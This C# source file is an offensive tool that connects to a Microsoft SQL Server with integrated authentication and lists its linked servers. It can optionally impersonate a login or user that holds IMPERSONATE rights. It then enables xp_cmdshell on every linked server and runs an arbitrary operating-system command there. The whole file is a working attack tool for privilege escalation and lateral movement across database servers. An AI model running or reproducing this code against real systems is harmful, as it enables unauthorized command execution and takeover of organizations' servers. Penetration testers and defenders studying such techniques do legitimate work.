using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;

// Execute a command on ALL Linked SQL servers (only first order links as of now)
// Usage: sqlLinked.exe -h sql01.example.com -c "dir C:\Users" 
// Usage: sqlLinked.exe -h sql01.example.com -c "dir C:\Users" [-l or -u to impersonate login or user on the local server]

namespace SQL
{
    class Program
    {
        public static void Exec(String target, SqlConnection con, String cmd)
        {
            String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT " + target;
            String execCmd = "select * from openquery(" + target + ",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))')";

            SqlCommand command = new SqlCommand(enable_xpcmd, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: ");
            Console.WriteLine(reader[0]);
            if (reader.HasRows)
            {
                int count = reader.FieldCount;
                while (reader.Read())
                {

                    for (int i = 0; i < count; i++)
                    {
                        Console.WriteLine(reader.GetValue(i));
                    }
                }
            }
            reader.Close();
        }

        public static String TestLink(String host, SqlConnection con, String type)
        {
            String cmd = "";
            if (type == "login")
            {
                cmd = "version from openquery(\"" + host + "\", 'select SYSTEM_USER as version')";
            }
            else if (type == "system")
            {
                cmd = "version from openquery(\"" + host + "\", 'select @@version as version')";
            }
            else if (type == "curr_login")
            {
                cmd = "USER_NAME();";
            }
            else if (type == "curr_system")
            {
                cmd = "@@servername;";
            }

            String execCmd = "select " + cmd;
            try
            {
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();

                String res = (String)reader[0];
                reader.Close();
                return res;
            }

            catch(SqlException except)
            {
                Console.WriteLine("Error Logging into "+host+"\nException:\n"+except);
                return null;
            }

            
        }
        static void Main(string[] args)
        {
            String sqlServer = "";
            String database = "master";
            String cmd = "whoami";
            String user = "";
            String login = "";

            for (var i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h") { sqlServer = args[i + 1]; }
                else if (args[i] == "-d") { database = args[i + 1]; }
                else if (args[i] == "-c") { cmd = args[i + 1]; }
                else if (args[i] == "-l") { login = args[i + 1]; }
                else if (args[i] == "-u") { user = args[i + 1]; }
            }

            if (sqlServer == "")
            {
                Console.WriteLine("Please specify a host with -h <host>");
                Environment.Exit(0);
            }

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String execCmd = "EXEC sp_linkedservers;";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            List<string> hosts = new List<string>();
            while (reader.Read())
            {
                hosts.Add((String)reader[0]);
            }
            reader.Close();


            if (login != "")
            {
                Console.WriteLine("Attempting login-based impersonation");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();

                while (reader.Read() == true)
                {
                    Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS LOGIN = '" + login + "';";

                command = new SqlCommand(executeas, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            else if (user != "")
            {
                Console.WriteLine("Attempting user-based impersonation");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();

                while (reader.Read() == true)
                {
                    Console.WriteLine("Logins that can be impersonated (Not usernames): " + reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT USER_NAME();";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS USER = '" + user + "';";

                command = new SqlCommand(executeas, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            else
            {
                Console.WriteLine("Executing without impersonation - use either -u for username impersonation or -l for login impersonation");
            }


            String[] hostArray = hosts.ToArray();
            Console.WriteLine("Executing as the login " + TestLink("", con, "curr_login") + " On " + TestLink("", con, "curr_system") + "\n");
            for (int i = 0; i < hostArray.Length; i++)
            {
                if (hostArray[i].Contains(TestLink("", con, "curr_system")))
                {
                    Console.WriteLine("----------\n");
                    Console.WriteLine("NOT Testing Local SQL server: " + hostArray[i] + "\n");
                    Console.WriteLine("----------\n");
                }
                else
                {
                    Console.WriteLine("----------\n");
                    String currentLogin = TestLink(hostArray[i], con, "login");
                    if (currentLogin!= null)
                    {
                        Console.WriteLine("Testing Linked SQL server: " + hostArray[i] + " - Executing as " + currentLogin + "\n");
                        Console.WriteLine("System Version: " + TestLink(hostArray[i], con, "system"));
                        Console.WriteLine("Testing Execution: ");
                        Exec(hostArray[i], con, cmd);
                    }

                }

            }

            con.Close();
        }
    }
}
